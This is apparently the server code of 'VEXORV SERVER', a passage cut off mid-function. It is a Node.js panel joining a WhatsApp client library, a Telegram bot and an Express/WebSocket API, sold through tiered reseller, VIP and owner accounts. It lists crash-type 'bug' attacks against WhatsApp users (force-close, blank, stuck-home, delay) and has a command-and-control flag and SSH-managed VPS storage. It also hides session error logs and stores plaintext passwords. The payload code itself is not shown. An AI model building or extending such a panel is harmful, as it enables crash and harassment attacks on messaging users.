// index.js — VEXORV SERVER (FIXED EDITION) 🔥

const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);

process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};

process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;

// ========== DEPENDENCIES & MODULES ==========
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    fetchLatestBaileysVersion,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');

const express = require("express");
const bodyParser = require('body-parser');
const readline = require("readline");
const crypto = require("crypto");
const cors = require('cors');
const multer = require('multer');
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const fsPromises = require('fs').promises;
const path = require('path');
const pino = require('pino');
const P = require('pino');
const axios = require('axios');
const vm = require('vm');
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const si = require('systeminformation'); 
const { Client } = require('ssh2');
const config = require('./config.js');
const telegramDataPath = "telegram.json";
const STORAN_FILE = './storan.json';
const QR_CODE_PAYMENT = config.QR_CODE_PAYMENT;

const STORAN_DATA = {
  pending: [],
  history: []
};

function loadStoranData() {
  if (!fs.existsSync(STORAN_FILE)) {
    fs.writeFileSync(STORAN_FILE, JSON.stringify(STORAN_DATA, null, 2));
  }
  return JSON.parse(fs.readFileSync(STORAN_FILE));
}

function saveStoranData(data) {
  fs.writeFileSync(STORAN_FILE, JSON.stringify(data, null, 2));
}

function generateStoranId() {
  return 'STOR-' + Date.now().toString(36).toUpperCase();
}

function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) {
    fs.writeFileSync(telegramDataPath, JSON.stringify({ 
      devList: [],
      ownerList: [], 
      ptList: [],
      vipList: [],
      resellerList: [],
      fullupList: [],
      userList: []
    }, null, 2));
  }
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function getFormattedUsers() {
  const db = loadDatabase();
  if (db.length === 0) return "Belum ada user terdaftar.";
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

function getMainKeyboard(role) {
    const style = styles[styleIndex];
    styleIndex++;
    if (styleIndex >= styles.length) styleIndex = 0;

    let buttons = [];

    if (role === 'developer') {
        buttons = [
            [{ text: "👤 Buat Akun Member", callback_data: "create_member", style }],
            [{ text: "📈 Buat Akun Reseller", callback_data: "create_reseller", style }],
            [{ text: "⭐ Buat Akun VIP", callback_data: "create_vip", style }],
            [{ text: "💎 Buat Akun PT", callback_data: "create_pt", style }],
            [{ text: "👑 Buat Akun Owner", callback_data: "create_owner", style }],
            [{ text: "👑 Buat Akun Developer", callback_data: "create_developer", style }],
            [{ text: "➕ Add Reseller", callback_data: "add_reseller", style }],
            [{ text: "➕ Add VIP", callback_data: "add_vip", style }],
            [{ text: "➕ Add PT", callback_data: "add_pt", style }],
            [{ text: "➕ Add Owner", callback_data: "add_owner", style }],
            [{ text: "➕ Add Developer", callback_data: "add_developer", style }],
            [{ text: "⏳ Set Expired", callback_data: "set_expire", style }],
            [{ text: "📦 Storan", callback_data: "storan", style }],
            [{ text: "📋 List User", callback_data: "list_user", style }],
            [{ text: "🗑 Hapus User", callback_data: "delete_user", style }],
            [{ text: "📋 List Command", callback_data: "list_command", style }]
        ];
    } else if (role === 'owner') {
        buttons = [
            [{ text: "👤 Buat Akun Member", callback_data: "create_member", style }],
            [{ text: "📈 Buat Akun Reseller", callback_data: "create_reseller", style }],
            [{ text: "⭐ Buat Akun VIP", callback_data: "create_vip", style }],
            [{ text: "💎 Buat Akun PT", callback_data: "create_pt", style }],
            [{ text: "👑 Buat Akun Owner", callback_data: "create_owner", style }],
            [{ text: "➕ Add Reseller", callback_data: "add_reseller", style }],
            [{ text: "➕ Add VIP", callback_data: "add_vip", style }],
            [{ text: "➕ Add PT", callback_data: "add_pt", style }],
            [{ text: "➕ Add Owner", callback_data: "add_owner", style }],
            [{ text: "⏳ Set Expired", callback_data: "set_expire", style }],
            [{ text: "📦 Storan", callback_data: "storan", style }],
            [{ text: "📋 List User", callback_data: "list_user", style }],
            [{ text: "🗑 Hapus User", callback_data: "delete_user", style }],
            [{ text: "📋 List Command", callback_data: "list_command", style }]
        ];
    } else if (role === 'pt') {
        buttons = [
            [{ text: "👤 Buat Akun Member", callback_data: "create_member", style }],
            [{ text: "📈 Buat Akun Reseller", callback_data: "create_reseller", style }],
            [{ text: "⭐ Buat Akun VIP", callback_data: "create_vip", style }],
            [{ text: "💎 Buat Akun PT", callback_data: "create_pt", style }],
            [{ text: "➕ Add Reseller", callback_data: "add_reseller", style }],
            [{ text: "➕ Add VIP", callback_data: "add_vip", style }],
            [{ text: "➕ Add PT", callback_data: "add_pt", style }],
            [{ text: "⏳ Set Expired", callback_data: "set_expire", style }],
            [{ text: "📦 Storan", callback_data: "storan", style }],
            [{ text: "📋 List User", callback_data: "list_user", style }],
            [{ text: "🗑 Hapus User", callback_data: "delete_user", style }],
            [{ text: "📋 List Command", callback_data: "list_command", style }]
        ];
    } else if (role === 'reseller') {
        buttons = [
            [{ text: "👤 Buat Akun Member", callback_data: "create_member", style }],
            [{ text: "📈 Buat Akun Reseller", callback_data: "create_reseller", style }],
            [{ text: "⭐ Buat Akun VIP", callback_data: "create_vip", style }],
            [{ text: "➕ Add Reseller", callback_data: "add_reseller", style }],
            [{ text: "➕ Add VIP", callback_data: "add_vip", style }],
            [{ text: "⏳ Set Expired", callback_data: "set_expire", style }],
            [{ text: "📦 Storan", callback_data: "storan", style }],
            [{ text: "📋 List User", callback_data: "list_user", style }],
            [{ text: "🗑 Hapus User", callback_data: "delete_user", style }],
            [{ text: "📋 List Command", callback_data: "list_command", style }]
        ];
    } else if (role === 'vip') {
        buttons = [
            [{ text: "👤 Buat Akun Member", callback_data: "create_member", style }],
            [{ text: "📈 Buat Akun Reseller", callback_data: "create_reseller", style }],
            [{ text: "⭐ Buat Akun VIP", callback_data: "create_vip", style }],
            [{ text: "➕ Add Reseller", callback_data: "add_reseller", style }],
            [{ text: "➕ Add VIP", callback_data: "add_vip", style }],
            [{ text: "⏳ Set Expired", callback_data: "set_expire", style }],
            [{ text: "📦 Storan", callback_data: "storan", style }],
            [{ text: "📋 List User", callback_data: "list_user", style }],
            [{ text: "🗑 Hapus User", callback_data: "delete_user", style }],
            [{ text: "📋 List Command", callback_data: "list_command", style }]
        ];
    } else if (role === 'fullup') {
        buttons = [
            [{ text: "👤 Buat Akun Member", callback_data: "create_member", style }],
            [{ text: "📈 Buat Akun Reseller", callback_data: "create_reseller", style }],
            [{ text: "⏳ Set Expired", callback_data: "set_expire", style }],
            [{ text: "📦 Storan", callback_data: "storan", style }],
            [{ text: "📋 List User", callback_data: "list_user", style }],
            [{ text: "🗑 Hapus User", callback_data: "delete_user", style }],
            [{ text: "📋 List Command", callback_data: "list_command", style }]
        ];
    } else {
        buttons = [
            [{ text: "👤 Buat Akun Member", callback_data: "create_member", style }],
            [{ text: "📦 Storan", callback_data: "storan", style }],
            [{ text: "📋 List Command", callback_data: "list_command", style }]
        ];
    }

    return { inline_keyboard: buttons };
}

const randomvidios = config.randomVideos;

const getRandomVidio = () => randomvidios[Math.floor(Math.random() * randomvidios.length)];

const menuEffects = [
  "5104841245755180586",
  "5107584321108051014",
  "5159385139981059251",
  "5046509860389126442"
];

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// ==========================================
// TELEGRAM BOT CONFIGURATION
// ==========================================
const token = config.Token; 
const bot = new TelegramBot(token, { polling: true });

const telegramConfig = {
    ownerId: config.IDOwn,
    ownerUsername: config.OwnerUsn,
    channelUsername: config.ChanelUsn,
    botUsername: config.BotUsn
};

// FIX: TARGET_GROUP_ID pake string
const TARGET_GROUP_ID = config.IdGb;

// ========== VARIABEL INFORMASI ==========
let informasiText = "Vexorv Server";
let tanggalText = "";
let hariText = "";

// ========== FUNGSI KIRIM PESAN DENGAN FOTO + BUTTON ==========
const fotoUrls = config.Foto;

function getRandomFoto() {
  return fotoUrls[Math.floor(Math.random() * fotoUrls.length)];
}

function getDefaultButtons() {
    const owner = telegramConfig.ownerUsername || 'Chs_Caze';
    const channel = telegramConfig.channelUsername || 'Chs_Caze';
    const botName = telegramConfig.botUsername || 'scarrydeathckey_bot';
    return {
        inline_keyboard: [
            [
                {
                    text: "👑 OWNER",
                    url: `https://t.me/${owner}`,
                    style: "primary"
                },
                {
                    text: "📢 CHANNEL",
                    url: `https://t.me/${channel}`,
                    style: "primary"
                },
                {
                    text: "🤖 CHAT BOT",
                    url: `https://t.me/${botName}`,
                    style: "primary"
                }
            ]
        ]
    };
}

// ─── FIXED sendWithPhoto ──────────────────────────────────────────────
async function sendWithPhoto(chatId, text, extra = {}) {
  if (!chatId) {
    console.error('[SEND PHOTO] chatId kosong!');
    return;
  }

  const foto = getRandomFoto();
  const buttons = getDefaultButtons();
  
  let finalReplyMarkup = buttons;
  if (extra.reply_markup) {
    const existing = extra.reply_markup.inline_keyboard || [];
    finalReplyMarkup.inline_keyboard = [...buttons.inline_keyboard, ...existing];
  }
  
  const cleanText = text
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/&(?![a-zA-Z]+;)/g, '&amp;');
  
  try {
    await bot.sendPhoto(chatId, foto, {
      caption: cleanText,
      parse_mode: "HTML",
      reply_markup: finalReplyMarkup,
      ...extra
    });
  } catch (e) {
    console.error('[SEND PHOTO ERROR]', e.message);
    try {
      await bot.sendPhoto(chatId, foto, {
        caption: cleanText.replace(/<[^>]*>/g, ''),
        reply_markup: finalReplyMarkup,
        ...extra
      });
    } catch (e2) {
      console.error('[SEND PHOTO FALLBACK ERROR]', e2.message);
      try {
        await bot.sendMessage(chatId, cleanText.replace(/<[^>]*>/g, ''), {
          reply_markup: finalReplyMarkup,
          ...extra
        });
      } catch (e3) {
        console.error('[SEND PHOTO LAST RESORT ERROR]', e3.message);
      }
    }
  }
}

// ─── safeSendMessage ──────────────────────────────────────────────────
async function safeSendMessage(chatId, text, extra = {}) {
  if (!chatId) return;
  
  const cleanText = text
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/&(?![a-zA-Z]+;)/g, '&amp;');
  
  try {
    await bot.sendMessage(chatId, cleanText, {
      parse_mode: "HTML",
      ...extra
    });
  } catch (e) {
    console.error('[SAFE SEND ERROR]', e.message);
    try {
      await bot.sendMessage(chatId, cleanText.replace(/<[^>]*>/g, ''), {
        ...extra
      });
    } catch (e2) {
      console.error('[SAFE SEND FALLBACK ERROR]', e2.message);
    }
  }
}

// ─── FIXED broadcastToGroup ────────────────────────────────────────────
async function broadcastToGroup(message) {
    if (!TARGET_GROUP_ID) {
        console.log('[BROADCAST] TARGET_GROUP_ID tidak diset, skip.');
        return;
    }

    try {
        // CEK APAKAH BOT SUDAH JOIN GROUP
        try {
            const chat = await bot.getChat(TARGET_GROUP_ID);
            console.log('[BROADCAST] Group ditemukan:', chat.title || chat.id);
        } catch (e) {
            console.error('[BROADCAST] Bot belum join group atau group tidak valid!');
            console.error('[BROADCAST] Error:', e.message);
            try {
                await bot.sendMessage(OWNER_ID, 
                    `⚠️ *ERROR BROADCAST*\n\n` +
                    `Bot belum join ke group target!\n` +
                    `Group ID: ${TARGET_GROUP_ID}\n` +
                    `Error: ${e.message}\n\n` +
                    `✅ SOLUSI: Undang bot ke group terlebih dahulu!`
                );
            } catch (e2) {}
            return;
        }

        await sendWithPhoto(TARGET_GROUP_ID, message);
    } catch (e) {
        console.error('[BROADCAST] Gagal kirim ke group:', e.message);
    }
}

// =========================================================================
// MIDDLEWARE TAMBAHAN
// =========================================================================
app.use(cors()); 
app.use(express.json()); 
app.use(bodyParser.json({ limit: '500mb' }));
app.use('/uploads', express.static('uploads'));

// ─── MULTER STORAGE ─────────────────────────────────────────────────
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    let folder = 'uploads/others';
    if (file.fieldname === 'video') folder = 'uploads/videos';
    else if (file.fieldname === 'profilePic') folder = 'uploads/profiles';
    if (!fs.existsSync(folder)) fs.mkdirSync(folder, { recursive: true });
    cb(null, folder);
  },
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname);
    cb(null, `${Date.now()}-${Math.random().toString(36).substring(7)}${ext}`);
  }
});

const socialUpload = multer({
  storage,
  limits: { fileSize: 100 * 1024 * 1024 }
});

// ========== RATE LIMITER ==========
const rateLimitMap = new Map();

function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || req.ip;
  if (!key) return next();

  const now = Date.now();
  const windowMs = 60000;
  const maxRequests = 60;

  if (!rateLimitMap.has(key)) {
    rateLimitMap.set(key, []);
  }

  const timestamps = rateLimitMap.get(key);
  const validTimestamps = timestamps.filter(ts => now - ts < windowMs);
  
  if (validTimestamps.length >= maxRequests) {
    console.warn(`[🚫 RATE LIMIT] IP ${key} melebihi batas ${maxRequests} req/menit.`);
    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: `Terlalu banyak permintaan! Maksimal ${maxRequests} request per menit.`,
      retryAfter: Math.ceil((validTimestamps[0] + windowMs - now) / 1000)
    });
  }

  validTimestamps.push(now);
  rateLimitMap.set(key, validTimestamps);
  next();
}

setInterval(() => {
  const now = Date.now();
  for (const [key, timestamps] of rateLimitMap) {
    const valid = timestamps.filter(ts => now - ts < 60000);
    if (valid.length === 0) {
      rateLimitMap.delete(key);
    } else {
      rateLimitMap.set(key, valid);
    }
  }
}, 60000);

app.use(rateLimiter);

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS, DELETE");
  res.header("Access-Control-Allow-Headers", "Content-Type, Authorization");
  next();
});

// ========== DATABASE CACHING ==========
let dbCache = null;
let dbCacheTime = 0;
const DB_CACHE_TTL = 5000;

function loadDatabaseCached() {
  const now = Date.now();
  if (dbCache && (now - dbCacheTime < DB_CACHE_TTL)) {
    return dbCache;
  }
  dbCache = loadDatabase();
  dbCacheTime = now;
  return dbCache;
}

function invalidateCache() {
  dbCache = null;
  dbCacheTime = 0;
}

// ========== VARIABLES & CONFIGURATION ==========
let wsClients = {};
let chatList = [];
const CHAT_FILE = 'chat.json';
const DB_PATH = "./database.json";
const SESSION_PATH = path.join(__dirname, "permenmd");
const THIRTY_MINUTES = 30 * 60 * 1000;
const qrCodes = {};
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
let createAccountState = {};
let addRoleState = {};
let deleteUserState = {};
let setExpireState = {};
let menuMsg = null;
let menuAnimation = null;
const styles = ["primary", "success", "danger", "warning"];
let styleIndex = 0;

const bugs = [
  { bug_id: "delayv1", bug_name: "DELAY V1" },
  { bug_id: "delayhard", bug_name: "DELAY HARD" },
  { bug_id: "blank", bug_name: "BLANK NO CLICK" },
  { bug_id: "force", bug_name: "FC CLICK" },
  { bug_id: "fcno", bug_name: "FC NO CLICK" },
  { bug_id: "stuck", bug_name: "STUCK HOME" },
];
let cncActive = true;
let vpsList = [];
let vpsConnections = {};
const VPS_FILE = 'vps.json';

const OWNER_ID = 1927022757; 

// ========== GLOBAL VARIABLES ==========
let informationText = "Vexorv Server - Chs_Caze";
const LOGS_DIR = path.join(__dirname, 'user_logs');

if (!fs.existsSync(LOGS_DIR)) {
  fs.mkdirSync(LOGS_DIR, { recursive: true });
}

// ========== BANNED USERS (BAN SYSTEM) ==========
const BANNED_FILE = path.join(__dirname, 'banned.json');

function loadBannedUsers() {
    if (fs.existsSync(BANNED_FILE)) {
        try {
            const data = JSON.parse(fs.readFileSync(BANNED_FILE, 'utf8'));
            return data.banned || [];
        } catch(e) {
            console.log('[BAN] Error loading banned file, creating new one');
        }
    }
    return [];
}

function saveBannedUsers(bannedList) {
    fs.writeFileSync(BANNED_FILE, JSON.stringify({ banned: bannedList, updated: new Date().toISOString() }, null, 2));
}

function isUserBanned(userId) {
    const banned = loadBannedUsers();
    return banned.includes(userId);
}

function banUser(userId) {
    const banned = loadBannedUsers();
    if (!banned.includes(userId)) {
        banned.push(userId);
        saveBannedUsers(banned);
        return true;
    }
    return false;
}

function unbanUser(userId) {
    const banned = loadBannedUsers();
    const index = banned.indexOf(userId);
    if (index !== -1) {
        banned.splice(index, 1);
        saveBannedUsers(banned);
        return true;
    }
    return false;
}

function saveUserLog(username, type, title, description) {
  try {
    const userLogPath = path.join(LOGS_DIR, `${username}.json`);
    let logs = [];
    if (fs.existsSync(userLogPath)) {
      logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));
    }
    logs.push({
      type: type,
      title: title,
      description: description,
      timestamp: Date.now()
    });
    fs.writeFileSync(userLogPath, JSON.stringify(logs, null, 2));
    console.log(`[LOGS] Activity saved for ${username}: ${type}`);
  } catch (err) {
    console.error(`[LOGS] Gagal simpan log ${username}:`, err.message);
  }
}

function hapusIsiUserLogs() {
  if (!fs.existsSync(LOGS_DIR)) {
    console.log("[AUTOCLEAN LOGS] Folder tidak ditemukan");
    return;
  }
  const files = fs.readdirSync(LOGS_DIR);
  for (const file of files) {
    const filePath = path.join(LOGS_DIR, file);
    fs.rmSync(filePath, { recursive: true, force: true });
  }
  console.log("[AUTOCLEAN LOGS] Isi folder berhasil dihapus");
}

// ========== HELPER FUNCTIONS ==========
function isGroupChat(chatId) {
    return chatId < 0;
}

function sanitize(text) {
    if (typeof text !== 'string') return text;
    return text.replace(/[<>]/g, '');
}

// =========================================================
// ═══ ROLE HIERARCHY SYSTEM ═══
// =========================================================
const roleHierarchy = {
    developer: ['owner', 'pt', 'vip', 'reseller', 'fullup', 'member'],
    owner: ['pt', 'vip', 'reseller', 'fullup', 'member'],
    pt: ['vip', 'reseller', 'fullup', 'member'],
    vip: ['reseller', 'member'],
    reseller: ['fullup', 'member'],
    fullup: [],
    member: []
};

const validRoles = ['developer', 'owner', 'pt', 'vip', 'reseller', 'fullup', 'member'];

function getRoleLevel(role) {
    const levels = {
        developer: 6,
        owner: 5,
        pt: 4,
        vip: 3,
        reseller: 2,
        fullup: 1,
        member: 0
    };
    return levels[role] ?? -1;
}

function canCreateRole(creatorRole, targetRole) {
    if (targetRole === 'developer') return false;
    if (creatorRole === 'owner' && (targetRole === 'developer' || targetRole === 'owner')) {
        return false;
    }
    if (creatorRole === 'pt' && (targetRole === 'developer' || targetRole === 'owner' || targetRole === 'pt')) {
        return false;
    }
    if (creatorRole === 'vip' && targetRole !== 'reseller' && targetRole !== 'member') {
        return false;
    }
    if (creatorRole === 'reseller' && targetRole !== 'fullup' && targetRole !== 'member') {
        return false;
    }
    if (creatorRole === 'fullup' || creatorRole === 'member') {
        return false;
    }
    if (!roleHierarchy[creatorRole]) return false;
    return roleHierarchy[creatorRole].includes(targetRole);
}

function hasBotAccess(role) {
    return validRoles.includes(role);
}

// ========== DATABASE FUNCTIONS ==========
const loadDatabase = () => {
  try {
    const data = fs.readFileSync(DB_PATH, 'utf8');
    const parsed = JSON.parse(data);
    if (!parsed.users) parsed.users = [];
    if (!parsed.posts) parsed.posts = [];
    if (!parsed.nextUserId) parsed.nextUserId = 4;
    if (!parsed.nextPostId) parsed.nextPostId = 2;
    return parsed;
  } catch (e) {
    const defaultDB = {
      users: [
        { id: 'u1', name: 'ZAMZZZ DEWA', username: '@zamzzz_dewa', password: 'zamzzz123', profilePic: null, followers: ['u2', 'u3'], following: ['u2'] },
        { id: 'u2', name: 'SI GOBLOK KEREN', username: '@goblock_keren', password: 'goblock123', profilePic: null, followers: ['u1'], following: ['u3'] },
        { id: 'u3', name: 'EMPIK MANIA', username: '@empik_mania', password: 'empik123', profilePic: null, followers: [], following: ['u1', 'u2'] }
      ],
      posts: [
        {
          id: 'p1',
          userId: 'u1',
          username: '@zamzzz_dewa',
          caption: 'EMPIK ENAK BANGET GOBLOK! 😈🔥',
          videoUrl: '/uploads/videos/banner.mp4',
          thumbnail: null,
          createdAt: new Date(Date.now() - 3600000).toISOString(),
          likes: ['u2', 'u3'],
          comments: [
            { userId: 'u2', username: '@goblock_keren', text: 'EMPING!', createdAt: new Date(Date.now() - 1800000).toISOString() },
            { userId: 'u3', username: '@empik_mania', text: 'GUA MAU!', createdAt: new Date(Date.now() - 900000).toISOString() }
          ]
        }
      ],
      nextUserId: 4,
      nextPostId: 2
    };
    fs.writeFileSync(DB_PATH, JSON.stringify(defaultDB, null, 2));
    return defaultDB;
  }
};

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
  invalidateCache();
}

function writeDB(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
  invalidateCache();
}

function getUserRoleFromDatabase(telegramId) {
    const db = loadDatabaseCached();
    const user = db.users.find(u => u.telegramId === telegramId || u.username === String(telegramId));
    if (user) return user.role || 'full up';
    if (telegramId === OWNER_ID || (telegramConfig.ownerId && telegramConfig.ownerId === telegramId)) {
        return 'owner';
    }
    return null;
}

function isTelegramAuthorized(userId, requiredRole = null) {
    if (userId === OWNER_ID) return true;
    if (telegramConfig.ownerId === userId) return true;
    
    const userRole = getUserRoleFromDatabase(userId);
    if (!userRole) return false;
    
    if (requiredRole) {
        return getRoleLevel(userRole) >= getRoleLevel(requiredRole);
    }
    return true;
}

// ========== CORE LOGIC UTILITIES & EXPRESS ENDPOINTS ==========
function validateUserAccess(username, password) {
    const db = loadDatabaseCached();
    const user = db.users.find(u => u.username === username && u.password === password);
    if (!user) return { success: false, message: "Username atau password salah" };
    const today = new Date().toISOString().split("T")[0];
    if (user.expiredDate < today) return { success: false, message: "Akun Anda sudah expired" };
    return { success: true, user };
}

async function appendLogAsync(filePath, data) {
  try {
    if (fs.existsSync(filePath)) {
      const stats = fs.statSync(filePath);
      if (stats.size > 5 * 1024 * 1024) fs.writeFileSync(filePath, '');
    }
    await fsPromises.appendFile(filePath, data);
  } catch (err) {
    console.error(err.message);
  }
}

const PUBLIC_CHAT_FILE = path.join(__dirname, 'public_chat.json');
function loadPublicChat() {
    if (fs.existsSync(PUBLIC_CHAT_FILE)) {
        try { return JSON.parse(fs.readFileSync(PUBLIC_CHAT_FILE, 'utf8')); } catch (e) { return []; }
    }
    return [];
}
function savePublicChat(data) { fs.writeFileSync(PUBLIC_CHAT_FILE, JSON.stringify(data, null, 2)); }

app.post("/get-public-chat", (req, res) => {
    return res.status(200).json({ success: true, messages: loadPublicChat().slice(-50) });
});

app.post("/send-public-chat", (req, res) => {
    const { username, message } = req.body;
    if (!username || !message) return res.status(400).json({ success: false });
    const currentChats = loadPublicChat();
    currentChats.push({ username: sanitize(username), message: sanitize(message), time: new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' }) });
    savePublicChat(currentChats);
    return res.status(200).json({ success: true });
});

function getUserByKey(key) {
  try {
    const sessionList = JSON.parse(fs.readFileSync(KEY_FILE, "utf8"));
    return sessionList.find(e => e.sessionKey === key)?.username || null;
  } catch (e) { return null; }
}

const onlineUsers = new Set();

// =========================================================================
// WEBSOCKET SERVER HANDLER
// =========================================================================
wss.on('connection', function (ws) {
  let username;
  async function broadcastStats() {
    try {
      const cpu = await si.currentLoad();
      const mem = await si.mem();
      const fsSize = await si.fsSize();
      const stats = JSON.stringify({
        type: 'stats',
        onlineUsers: onlineUsers.size,
        activeConnections: wss.clients.size,
        cpu: `${cpu.currentLoad.toFixed(1)}%`,
        ram: `${((mem.active / mem.total) * 100).toFixed(1)}%`,
        disk: `${fsSize[0] ? fsSize[0].use.toFixed(1) : '0.0'}%`
      });
      wss.clients.forEach(c => { if (c.readyState === 1) c.send(stats); });
    } catch (e) {}
  }

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);
      
      if (data.type === 'auth') {
        const session = JSON.parse(fs.readFileSync(KEY_FILE, "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key);
        if (!validKey) {
          ws.send(JSON.stringify({ type: 'auth', valid: false }));
          return ws.close();
        }
        ws.username = validKey.username;
        onlineUsers.add(ws.username);
        broadcastStats();
        ws.send(JSON.stringify({ type: 'auth', valid: true, username: ws.username }));
        return;
      }

      if (data.type === 'stats') {
        broadcastStats();
        return;
      }
    } catch (e) {}
  });

  ws.on('close', () => {
    if (ws.username) onlineUsers.delete(ws.username);
    broadcastStats();
  });
});

// ========== FUNGSI CHAT (LOAD/SAVE) ==========
function loadChat() {
    if (fs.existsSync(CHAT_FILE)) {
        try {
            return JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
        } catch (e) { return []; }
    }
    return [];
}

function saveChat() {
    fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

chatList = loadChat();

function getUserProfile(username) {
    const db = loadDatabaseCached();
    const user = db.users.find(u => u.username === username);
    if (user) {
        return {
            username: user.username,
            name: user.username,
            role: user.role || 'full up',
        };
    }
    return null;
}

// ─── API ENDPOINTS CHAT ──────────────────────────────────────────

app.get('/chat/profile', (req, res) => {
    const { key } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
    const profile = getUserProfile(keyInfo.username);
    if (!profile) return res.json({ valid: false, message: 'User not found' });
    res.json({ valid: true, profile });
});

app.get('/chat/global/messages', (req, res) => {
    const { key, limit } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
    const limitNum = parseInt(limit) || 100;
    const messages = chatList
        .filter(m => m.to === 'public' || m.to === null || m.to === undefined)
        .slice(-limitNum)
        .map(m => {
            const senderProfile = getUserProfile(m.from);
            return {
                id: m.id,
                sender: m.from,
                senderProfile: senderProfile || { username: m.from, name: m.from },
                message: m.message,
                replyTo: m.replyTo || null,
                timestamp: m.timestamp || m.created_at || new Date().toISOString()
            };
        });
    res.json({ valid: true, messages });
});

app.post('/chat/global/send', (req, res) => {
    const { key } = req.query;
    const { message, replyTo } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
    if (!message || message.trim() === '') return res.json({ valid: false, message: 'Message empty' });
    
    const chat = {
        id: Date.now().toString(),
        from: keyInfo.username,
        to: 'public',
        message: message.trim(),
        replyTo: replyTo || null,
        timestamp: new Date().toISOString(),
        created_at: new Date().toISOString(),
        read: true
    };
    chatList.push(chat);
    saveChat();
    
    const payload = JSON.stringify({
        type: 'global_message',
        message: chat
    });
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN && client.username) {
            client.send(payload);
        }
    });
    
    res.json({ valid: true, status: 'sent' });
});

app.get('/chat/private/users', (req, res) => {
    const { key } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
    const username = keyInfo.username;
    const involved = chatList.filter(m => m.from === username || m.to === username);
    const usersSet = new Set();
    involved.forEach(m => {
        if (m.from === username && m.to !== 'public') usersSet.add(m.to);
        if (m.to === username && m.from !== 'public') usersSet.add(m.from);
    });
    const userList = Array.from(usersSet).map(u => {
        const profile = getUserProfile(u);
        const lastMsg = chatList.filter(m => (m.from === username && m.to === u) || (m.from === u && m.to === username))
            .sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp))[0];
        return {
            username: u,
            profile: profile || { username: u, name: u },
            lastMessage: lastMsg ? {
                sender: lastMsg.from,
                message: lastMsg.message,
                timestamp: lastMsg.timestamp,
                read: lastMsg.read || false
            } : null
        };
    });
    res.json({ valid: true, users: userList });
});

app.get('/chat/private/messages/:withUser', (req, res) => {
    const { key, limit } = req.query;
